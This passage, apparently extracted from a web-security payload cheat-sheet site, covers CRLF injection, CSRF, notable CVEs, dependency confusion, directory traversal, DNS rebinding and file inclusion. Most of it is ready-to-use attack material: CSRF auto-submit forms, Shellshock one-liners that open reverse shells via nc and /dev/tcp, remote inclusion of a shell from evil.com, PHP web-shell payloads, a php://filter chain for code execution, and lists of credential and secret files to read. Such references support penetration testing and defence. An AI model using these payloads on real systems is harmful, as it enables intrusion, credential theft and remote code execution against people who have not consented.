\u0026#34;842fe-597b-54415a5c97a80\u0026#34; Vary: Accept-Encoding X-UA-Compatible: IE=edge Server: NetDNA-cache/2.2 Link: \u0026lt;https://example.com/[INJECTION STARTS HERE] Content-Length:35 X-XSS-Protection:0 23 \u0026lt;svg onload=alert(document.domain)\u0026gt; 0 CRLF - Write HTML # Requested page\nhttp://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E HTTP response\nSet-Cookie:en Content-Length: 0 HTTP/1.1 200 OK Content-Type: text/html Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT Content-Length: 34 \u0026lt;html\u0026gt;You have been Phished\u0026lt;/html\u0026gt; CRLF - Filter Bypass # Using UTF-8 encoding\n%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE Remainder:\n%E5%98%8A = %0A = \\u560a %E5%98%8D = %0D = \\u560d %E5%98%BE = %3E = \\u563e (\u0026gt;) %E5%98%BC = %3C = \\u563c (\u0026lt;) Exploitation Tricks # Try to search for parameters that lead to redirects and fuzz them Also test the mobile version of the website, sometimes it is different or uses a different backend References # https://www.owasp.org/index.php/CRLF_Injection https://vulners.com/hackerone/H1:192749 "},{"id":41,"href":"/docs/csrf_injection/","title":"CSRF Injection","section":"Docs","content":" Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they\u0026rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP\nTools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.\nHTML GET - Requiring User Interaction # \u0026lt;a href=\u0026#34;http://www.example.com/api/setusername?username=CSRFd\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; HTML GET - No User Interaction # \u0026lt;img src=\u0026#34;http://www.example.com/api/setusername?username=CSRFd\u0026#34;\u0026gt; HTML POST - Requiring User Interaction # \u0026lt;form action=\u0026#34;http://www.example.com/api/setusername\u0026#34; enctype=\u0026#34;text/plain\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;CSRFd\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit Request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; HTML POST - AutoSubmit - No User Interaction # \u0026lt;form id=\u0026#34;autosubmit\u0026#34; action=\u0026#34;http://www.example.com/api/setusername\u0026#34; enctype=\u0026#34;text/plain\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;CSRFd\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit Request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;autosubmit\u0026#34;).submit(); \u0026lt;/script\u0026gt; HTML POST - multipart/form-data with file upload - Requiring User Interaction # \u0026lt;script\u0026gt; function launch(){ const dT = new DataTransfer(); const file = new File( [ \u0026#34;CSRF-filecontent\u0026#34; ], \u0026#34;CSRF-filename\u0026#34; ); dT.items.add( file ); document.xss[0].files = dT.files; document.xss.submit() } \u0026lt;/script\u0026gt; \u0026lt;form style=\u0026#34;display: none\u0026#34; name=\u0026#34;xss\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;\u0026lt;target\u0026gt;\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;file\u0026#34; type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;0\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;button value=\u0026#34;button\u0026#34; onclick=\u0026#34;launch()\u0026#34;\u0026gt;Submit Request\u0026lt;/button\u0026gt; JSON GET - Simple Request # \u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;http://www.example.com/api/currentuser\u0026#34;); xhr.send(); \u0026lt;/script\u0026gt; JSON POST - Simple Request # \u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;http://www.example.com/api/setrole\u0026#34;); //application/json is not allowed in a simple request. text/plain is the default xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/plain\u0026#34;); //You will probably want to also try one or both of these //xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); //xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;multipart/form-data\u0026#34;); xhr.send(\u0026#39;{\u0026#34;role\u0026#34;:admin}\u0026#39;); \u0026lt;/script\u0026gt; JSON POST - Complex Request # \u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;http://www.example.com/api/setrole\u0026#34;); xhr.withCredentials = true; xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json;charset=UTF-8\u0026#34;); xhr.send(\u0026#39;{\u0026#34;role\u0026#34;:admin}\u0026#39;); \u0026lt;/script\u0026gt; Bypass referer header validation # Basic payload # 1) Open https://attacker.com/csrf.html 2) Referer header is .. Referer: https://attacker.com/csrf.html With question mark(?) payload # 1) Open https://attacker.com/csrf.html?trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html?trusted.domain.com With semicolon(;) payload # 1) Open https://attacker.com/csrf.html;trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html;trusted.domain.com With subdomain payload # 1) Open https://trusted.domain.com.attacker.com/csrf.html 2) Referer headers is .. Referer: https://trusted.domain.com.attacker.com/csrf.html References # Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016 Cross-Site Request Forgery (CSRF) - OWASP Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial Hacking PayPal Accounts with one click (Patched) - Yasser Ali Add tweet to collection CSRF - vijay kumar Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones Hacking Facebook accounts using CSRF in Oculus-Facebook integration Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019 Cross-Site Request Forgery Attack - PwnFunction Wiping Out CSRF - Joe Rozner - Oct 17, 2017 Bypass referer check logic for CSRF "},{"id":42,"href":"/docs/cve_exploits/","title":"CVE Exploits","section":"Docs","content":" Common Vulnerabilities and Exposures # Big CVEs in the last 5 years. # CVE-2017-0144 - EternalBlue # EternalBlue exploits a vulnerability in Microsoft\u0026rsquo;s implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.\nAfftected systems:\nWindows Vista SP2 Windows Server 2008 SP2 and R2 SP1 Windows 7 SP1 Windows 8.1 Windows Server 2012 Gold and R2 Windows RT 8.1 Windows 10 Gold, 1511, and 1607 Windows Server 2016 CVE-2017-5638 - Apache Struts 2 # On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the “Content-Type” header.\nCVE-2018-7600 - Drupalgeddon 2 # A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.\nCVE-2019-0708 - BlueKeep # A remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.\nCVE-2019-19781 - Citrix ADC Netscaler # A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution.\nAffected products:\nCitrix ADC and Citrix Gateway version 13.0 all supported builds Citrix ADC and NetScaler Gateway version 12.1 all supported builds Citrix ADC and NetScaler Gateway version 12.0 all supported builds Citrix ADC and NetScaler Gateway version 11.1 all supported builds Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds Older, but not forgotten # CVE-2014-0160 - Heartbleed # The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).\nCVE-2014-6271 - Shellshock # Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.\necho -e \u0026#34;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\\r\\n\u0026#34; curl --silent -k -H \u0026#34;User-Agent: () { :; }; /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.2/4444 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;https://10.0.0.1/cgi-bin/admin.cgi\u0026#34; Thanks to # Heartbleed - Official website Shellshock - Wikipedia Imperva Apache Struts analysis EternalBlue - Wikipedia BlueKeep - Microsoft "},{"id":43,"href":"/docs/dependency_confusion_attacks/","title":"Dependency Confusion","section":"Docs","content":" Dependency Confusion # A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.\nTools # Confused Exploit # Look for npm, pip, gem packages, the methodology is the same : you register a public package with the same name of private one used by the company and then you wait for it to be used.\nNPM example # List all the packages (ie: package.json, composer.json, \u0026hellip;) Find the package missing from https://www.npmjs.com/ Register and create a public package with the same name Package example : https://github.com/0xsapra/dependency-confusion-expoit References # Exploiting Dependency Confusion - 2 Jul 2021 - 0xsapra Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan - 9 Feb 2021 Ways to Mitigate Risk When Using Private Package Feeds - Microsoft - 29/03/2021 $130,000+ Learn New Hacking Technique in 2021 - Dependency Confusion - Bug Bounty Reports Explained "},{"id":44,"href":"/docs/directory_traversal/","title":"Directory Traversal","section":"Docs","content":" Directory traversal # A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing \u0026ldquo;traverse to parent directory\u0026rdquo; are passed through to the file APIs.\nTools # dotdotpwn - https://github.com/wireghoul/dotdotpwn git clone https://github.com/wireghoul/dotdotpwn perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b Basic exploitation # We can use the .. characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.\n../ ..\\ ..\\/ %2e%2e%2f %252e%252e%252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 16 bits Unicode encoding # . = %u002e / = %u2215 \\ = %u2216 UTF-8 Unicode encoding # . = %c0%2e, %e0%40%ae, %c0ae / = %c0%af, %e0%80%af, %c0%2f \\ = %c0%5c, %c0%80%5c Bypass \u0026ldquo;../\u0026rdquo; replaced by \u0026quot;\u0026quot; # Sometimes you encounter a WAF which remove the \u0026ldquo;../\u0026rdquo; characters from the strings, just duplicate them.\n..././ ...\\.\\ Bypass \u0026ldquo;../\u0026rdquo; with \u0026ldquo;;\u0026rdquo; # ..;/ http://domain.tld/page.jsp?include=..;/..;/sensitive.txt Double URL encoding # . = %252e / = %252f \\ = %255c e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\nUNC Bypass # An attacker can inject a Windows UNC share (\u0026rsquo;\\UNC\\share\\name\u0026rsquo;) into a software system to potentially redirect access to an unintended location or arbitrary file.\n\\\\localhost\\c$\\windows\\win.ini NGINX/ALB Bypass # NGINX in certain configurations and ALB can block traversal attacks in the route, For example: http://nginx-server/../../ will return a 400 bad request.\nTo bypass this behaviour just add forward slashes in front of the url: http://nginx-server////////../../\nJava Bypass # Bypass Java\u0026rsquo;s URL protocol\nurl:file:///etc/passwd url:http://127.0.0.1:8080 Path Traversal # Interesting Linux files # /etc/issue /etc/passwd /etc/shadow /etc/group /etc/hosts /etc/motd /etc/mysql/my.cnf /proc/[0-9]*/fd/[0-9]* (first number is the PID, second is the filedescriptor) /proc/self/environ /proc/version /proc/cmdline /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/self/cwd/index.php /proc/self/cwd/main.py /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/namespace /run/secrets/kubernetes.io/serviceaccount/certificate /var/run/secrets/kubernetes.io/serviceaccount /var/lib/mlocate/mlocate.db /var/lib/mlocate.db Interesting Windows files # Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside\u0026hellip;\nc:\\windows\\system32\\license.rtf c:\\windows\\system32\\eula.txt Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)\nc:/boot.ini c:/inetpub/logs/logfiles c:/inetpub/wwwroot/global.asa c:/inetpub/wwwroot/index.asp c:/inetpub/wwwroot/web.config c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system32/inetsrv/metabase.xml c:/sysprep.inf c:/sysprep.xml c:/sysprep/sysprep.inf c:/sysprep/sysprep.xml c:/system volume information/wpsettings.dat c:/system32/inetsrv/metabase.xml c:/unattend.txt c:/unattend.xml c:/unattended.txt c:/unattended.xml c:/windows/repair/sam c:/windows/repair/system The following log files are controllable and can be included with an evil payload to achieve a command execution\n/var/log/apache/access.log /var/log/apache/error.log /var/log/httpd/error_log /usr/local/apache/log/error_log /usr/local/apache2/log/error_log /var/log/nginx/access.log /var/log/nginx/error.log /var/log/vsftpd.log /var/log/sshd.log /var/log/mail References # Path Traversal Cheat Sheet: Windows Directory traversal attack - Wikipedia CWE-40: Path Traversal: \u0026lsquo;\\UNC\\share\\name' (Windows UNC Share) - CWE Mitre - December 27, 2018 NGINX may be protecting your applications from traversal attacks without you even knowing Directory traversal - Portswigger "},{"id":45,"href":"/docs/dns_rebinding/","title":"DNS Rebinding","section":"Docs","content":" DNS Rebinding # DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.\nTools # Singularity of Origin - is a tool to perform DNS rebinding attacks. Singularity of Origin Web Client (manager interface, port scanner and autoattack) Exploitation # First, we need to make sure that the targeted service is vulnerable to DNS rebinding. It can be done with a simple curl request:\ncurl --header \u0026#39;Host: \u0026lt;arbitrary-hostname\u0026gt;\u0026#39; http://\u0026lt;vulnerable-service\u0026gt;:8080 If the server returns the expected result (e.g. the regular web page) then the service is vulnerable. If the server returns an error message (e.g. 404 or similar), the server has most likely protections implemented which prevent DNS rebinding attacks.\nThen, if the service is vulnerable, we can abuse DNS rebinding by following these steps:\nRegister a domain. Setup Singularity of Origin. Edit the autoattack HTML page for your needs. Browse to \u0026ldquo;http://rebinder.your.domain:8080/autoattack.html\". Wait for the attack to finish (it can take few seconds/minutes). Protection Bypasses # Most DNS protections are implemented in the form of blocking DNS responses containing unwanted IP addresses at the perimeter, when DNS responses enter the internal network. The most common form of protection is to block private IP addresses as defined in RFC 1918 (i.e. 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Some tools allow to additionally block localhost (127.0.0.0/8), local (internal) networks, or 0.0.0.0/0 network ranges.\nIn the case where DNS protection are enabled (generally disabled by default), NCC Group has documented multiple DNS protection bypasses that can be used.\n0.0.0.0 # We can use the IP address 0.0.0.0 to access the localhost (127.0.0.1) to bypass filters blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8.\nCNAME # We can use DNS CNAME records to bypass a DNS protection solution that blocks all internal IP addresses. Since our response will only return a CNAME of an internal server, the rule filtering internal IP addresses will not be applied. Then, the local, internal DNS server will resolve the CNAME.\n$ dig cname.example.com +noall +answer ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.3-1ubuntu1.15-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; example.com +noall +answer ;; global options: +cmd cname.example.com. 381 IN CNAME target.local. localhost # We can use \u0026ldquo;localhost\u0026rdquo; as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1.\n$ dig www.example.com +noall +answer ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.3-1ubuntu1.15-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; example.com +noall +answer ;; global options: +cmd localhost.example.com. 381 IN CNAME localhost. References # How Do DNS Rebinding Attacks Work? - nccgroup, 2019 "},{"id":46,"href":"/docs/file_inclusion/","title":"File Inclusion","section":"Docs","content":" File Inclusion # The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \u0026ldquo;dynamic file inclusion\u0026rdquo; mechanisms implemented in the target application.\nThe Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \u0026ldquo;reading\u0026rdquo; mechanism implemented in the target application\nTools # Kadimus - https://github.com/P0cL4bs/Kadimus LFISuite - https://github.com/D35m0nd142/LFISuite fimap - https://github.com/kurobeats/fimap panoptic - https://github.com/lightos/Panoptic Basic LFI # In the following examples we include the /etc/passwd file, check the Directory \u0026amp; Path Traversal chapter for more interesting files.\nhttp://example.com/index.php?page=../../../etc/passwd Null byte # :warning: In versions of PHP below 5.3.4 we can terminate with null byte.\nhttp://example.com/index.php?page=../../../etc/passwd%00 Double encoding # http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00 UTF-8 encoding # http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00 Path and dot truncation # On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.\nhttp://example.com/index.php?page=../../../etc/passwd............[ADD MORE] http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE] http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd Filter bypass tricks # http://example.com/index.php?page=....//....//etc/passwd http://example.com/index.php?page=..///////..////..//////etc/passwd http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd Basic RFI # Most of the filter bypasses from LFI section can be reused for RFI.\nhttp://example.com/index.php?page=http://evil.com/shell.txt Null byte # http://example.com/index.php?page=http://evil.com/shell.txt%00 Double encoding # http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt Bypass allow_url_include # When allow_url_include and allow_url_fopen are set to Off. It is still possible to include a remote file on Windows box using the smb protocol.\nCreate a share open to everyone Write a PHP code inside a file : shell.php Include it http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php LFI / RFI using wrappers # Wrapper php://filter # The part \u0026ldquo;php://filter\u0026rdquo; is case insensitive\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php Wrappers can be chained with a compression wrapper for large files.\nhttp://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd NOTE: Wrappers can be chained multiple times using | or /:\nMultiple base64 decodes: php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s deflate then base64encode (useful for limited character exfil): php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php ./kadimus -u \u0026#34;http://example.com/index.php?page=vuln\u0026#34; -S -f \u0026#34;index.php%00\u0026#34; -O index.php --parameter page curl \u0026#34;http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\u0026#34; | base64 -d \u0026gt; index.php Also there is a way to turn the php://filter into a full RCE. Use LFI2RCE.py to generate a custom payload.\n# vulnerable file: index.php # vulnerable parameter: file # executed command: id # executed PHP code: \u0026lt;?=`$_GET[0]`;;?\u0026gt; curl \u0026#34;127.0.0.1:8000/index.php?0=id\u0026amp;file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\u0026#34; Wrapper zip:// # Create an evil payload: echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;?php system($_GET['cmd']); ?\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot; \u0026gt; payload.php; Zip the file zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php Wrapper data:// # http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= NOTE: the payload is \u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);echo \u0026#39;Shell done !\u0026#39;; ?\u0026gt;\u0026#34; Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\nWrapper expect:// # http://example.com/index.php?page=expect://id http://example.com/index.php?page=expect://ls Wrapper input:// # Specify your payload in the POST parameters, this can be done with a simple curl command.\ncurl -X POST --data \u0026#34;\u0026lt;?php echo shell_exec(\u0026#39;id\u0026#39;); ?\u0026gt;\u0026#34; \u0026#34;https://example.com/index.php?page=php://input%00\u0026#34; -k -v Alternatively, Kadimus has a module to automate this attack.\n./kadimus -u \u0026#34;https://example.com/index.php?page=php://input%00\u0026#34; -C \u0026#39;\u0026lt;?php echo shell_exec(\u0026#34;id\u0026#34;); ?\u0026gt;\u0026#39; -T input Wrapper phar:// # Create a phar file with a serialized object in its meta-data.\n// create new Phar $phar = new Phar(\u0026#39;test.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;, \u0026#39;text\u0026#39;); $phar-\u0026gt;setStub(\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); // add object of any class as meta data class AnyClass {} $object = new AnyClass; $object-\u0026gt;data = \u0026#39;rips\u0026#39;; $phar-\u0026gt;setMetadata($object); $phar-\u0026gt;stopBuffering(); If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked\nclass AnyClass { function __destruct() { echo $this-\u0026gt;data; } } // output: rips include(\u0026#39;phar://test.phar\u0026#39;); NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.\nLFI to RCE via /proc/*/fd # Upload a lot of shells (for example : 100) Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with 